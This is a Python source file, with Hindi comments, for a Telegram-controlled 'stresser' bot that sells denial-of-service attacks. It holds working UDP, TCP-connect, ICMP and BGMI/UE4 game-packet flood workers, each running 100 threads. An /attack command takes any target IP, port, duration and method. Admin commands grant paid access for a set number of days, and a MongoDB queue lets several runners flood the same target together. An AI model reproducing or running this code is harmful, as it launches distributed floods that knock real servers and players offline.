import os
import sys
import json
import time
import socket
import random
import struct
import logging
import threading
from datetime import datetime, timedelta

import telebot
import certifi
from pymongo import MongoClient

# ==================== कॉन्फ़िग ====================
MONGO_URI = os.getenv("MONGO_URI", "")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
BOT_TOKEN = os.getenv("TELEGRAM_TOKEN", "YOUR_BOT_TOKEN_HERE")
RUNNER_ID = int(os.getenv("RUNNER_ID", "1"))  # 1 से 10

# ==================== MongoDB सेटअप ====================
if MONGO_URI:
    mongo_client = MongoClient(MONGO_URI, tlsCAFile=certifi.where())
    db = mongo_client["stresser_db"]
    users_collection = db["users"]
    attacks_collection = db["attacks"]
else:
    db = None
    users_collection = None
    attacks_collection = None

bot = telebot.TeleBot(BOT_TOKEN)
logging.basicConfig(format='%(asctime)s - %(levelname)s - %(message)s', level=logging.INFO)

# ==================== ग्लोबल वेरिएबल्स ====================
THREADS_PER_RUNNER = 100   # हर रनर 100 थ्रेड्स
attack_in_progress = False
attack_stop_event = threading.Event()
attack_start_time = 0
attack_duration = 0
current_method = "udp"
target_ip = ""
target_port = 0

# ==================== 🔥 अटैक इंजन (मल्टी-मेथड) ====================

# 1. UDP Flood (सामान्य)
def udp_worker(ip, port, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)
    payload = random._urandom(1400)
    while not stop_event.is_set():
        try:
            sock.sendto(payload, (ip, port))
        except:
            pass

# 2. TCP-SYN Flood (कनेक्शन रिक्वेस्ट से CPU खाओ)
def tcp_syn_worker(ip, port, stop_event):
    while not stop_event.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((ip, port))
            s.close()
        except:
            pass

# 3. ICMP (Ping) Flood – सिर्फ रूट पर काम करता है, नहीं तो UDP फॉलबैक
def icmp_worker(ip, port, stop_event):  # port ignored for icmp
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        while not stop_event.is_set():
            packet = struct.pack('!BBHHH', 8, 0, 0, 0, 1) + random._urandom(56)
            sock.sendto(packet, (ip, 0))
    except PermissionError:
        # ICMP न चले तो UDP बौछार
        udp_worker(ip, 80, stop_event)

# 4. BGMI/Game-Specific (UE4 हैंडशेक)
def game_worker(ip, port, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        # UE4 कनेक्ट पैकेट
        packet = b'\x00\x00\x00\x00' + b'\x01' + random._urandom(30)
        sock.sendto(packet, (ip, port))

# मेथड मैपिंग
METHODS = {
    "udp": udp_worker,
    "tcp": tcp_syn_worker,
    "icmp": icmp_worker,
    "game": game_worker,
}

def start_attack(ip, port, duration, method="udp"):
    global attack_in_progress, attack_start_time, attack_duration, target_ip, target_port, current_method
    attack_in_progress = True
    attack_start_time = time.time()
    attack_duration = duration
    target_ip = ip
    target_port = port
    current_method = method
    attack_stop_event.clear()

    worker = METHODS.get(method, udp_worker)
    for _ in range(THREADS_PER_RUNNER):
        t = threading.Thread(target=worker, args=(ip, port, attack_stop_event))
        t.daemon = True
        t.start()
    
    time.sleep(duration)
    stop_attack()

def stop_attack():
    global attack_in_progress
    attack_in_progress = False
    attack_stop_event.set()

# ==================== यूज़र चेक ====================
def is_user_approved(user_id):
    if not users_collection:
        return True
    user = users_collection.find_one({"user_id": user_id})
    if not user:
        return False
    valid_until_str = user.get("valid_until")
    if valid_until_str:
        try:
            valid_until = datetime.strptime(valid_until_str, "%Y-%m-%d")
            if datetime.now().date() > valid_until.date():
                users_collection.delete_one({"user_id": user_id})
                return False
        except:
            pass
    return True

# ==================== 📨 टेलीग्राम कमांड्स ====================

@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.reply_to(message, 
                 "🔥 *STRESSER BOT ACTIVE*\n"
                 "📌 `/attack <IP> <PORT> <DURATION> <METHOD>`\n"
                 "🛑 `/stop`\n"
                 "ℹ️ मेथड्स: `udp`, `tcp`, `icmp`, `game`\n"
                 "👑 Admin: `/approve`, `/disapprove`", 
                 parse_mode='Markdown')

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    global attack_in_progress
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not is_user_approved(user_id):
        bot.reply_to(message, "🚫 Access Denied! Contact Admin.", parse_mode='Markdown')
        return

    args = message.text.split()
    if len(args) < 4 or len(args) > 5:
        bot.reply_to(message, "⚠️ Format: `/attack <IP> <PORT> <DURATION> <METHOD>` (METHOD = udp/tcp/icmp/game)", parse_mode='Markdown')
        return

    ip = args[1]
    port = int(args[2])
    duration = int(args[3])
    method = args[4] if len(args) == 5 else "udp"

    if duration > 300:
        bot.reply_to(message, "⏳ Max 300 seconds.", parse_mode='Markdown')
        return

    if attack_in_progress:
        bot.reply_to(message, "⚠️ Attack running. Use /stop.", parse_mode='Markdown')
        return

    # 🔥 DB में कमांड सेव करो (ताकि बाकी रनर्स भी पढ़ सकें)
    if attacks_collection:
        attacks_collection.insert_one({
            "target_ip": ip,
            "target_port": port,
            "duration": duration,
            "method": method,
            "status": "pending",
            "initiated_by": user_id,
            "timestamp": datetime.now()
        })

    bot.reply_to(message, f"🚀 *Attack launched on {ip}:{port} for {duration}s using {method}*", parse_mode='Markdown')
    
    # 🚀 अटैक शुरू (यह रनर अपनी तरफ से)
    threading.Thread(target=start_attack, args=(ip, port, duration, method), daemon=True).start()

@bot.message_handler(commands=['stop'])
def stop_cmd(message):
    if attack_in_progress:
        stop_attack()
        bot.reply_to(message, "🛑 Attack stopped.")
    else:
        bot.reply_to(message, "❌ No attack.")

# ==================== 👑 एडमिन ====================
@bot.message_handler(commands=['approve'])
def approve_user(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "🚫 Admin only.")
        return
    args = message.text.split()
    if len(args) != 3:
        bot.reply_to(message, "⚠️ /approve <user_id> <days>")
        return
    target_id = int(args[1])
    days = int(args[2])
    valid_until = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
    users_collection.update_one(
        {"user_id": target_id},
        {"$set": {"user_id": target_id, "plan": 1, "valid_until": valid_until, "approved_by": ADMIN_ID}},
        upsert=True
    )
    bot.reply_to(message, f"✅ User {target_id} approved for {days} days.")

@bot.message_handler(commands=['disapprove'])
def disapprove_user(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "🚫 Admin only.")
        return
    args = message.text.split()
    if len(args) != 2:
        bot.reply_to(message, "⚠️ /disapprove <user_id>")
        return
    target_id = int(args[1])
    users_collection.delete_one({"user_id": target_id})
    bot.reply_to(message, f"🗑 User {target_id} removed.")

# ==================== मॉनिटर (DB से पढ़कर बाकी रनर्स को अटैक करने के लिए) ====================
def attack_monitor():
    global attack_in_progress
    if not attacks_collection:
        return
    while True:
        try:
            pending = attacks_collection.find_one({"status": "pending"})
            if pending and not attack_in_progress:
                ip = pending["target_ip"]
                port = pending["target_port"]
                duration = pending["duration"]
                method = pending.get("method", "udp")
                # इस रनर को अटैक शुरू करना है
                threading.Thread(target=start_attack, args=(ip, port, duration, method), daemon=True).start()
                # स्टेटस अपडेट करो ताकि दूसरे रनर दोबारा न शुरू करें
                attacks_collection.update_one({"_id": pending["_id"]}, {"$set": {"status": "executing"}})
                # अटैक खत्म होने के बाद क्लीनअप (10 सेकंड बाद डिलीट)
                time.sleep(duration + 5)
                attacks_collection.delete_one({"_id": pending["_id"]})
        except Exception as e:
            print(f"Monitor error: {e}")
        time.sleep(2)

# ==================== 🚀 मेन ====================
if __name__ == "__main__":
    # मॉनिटर थ्रेड शुरू करो (हर रनर में)
    threading.Thread(target=attack_monitor, daemon=True).start()
    
    print(f"🤖 Runner {RUNNER_ID} started polling...")
    try:
        bot.infinity_polling(timeout=30)
    except Exception as e:
        print(f"Polling error: {e}")
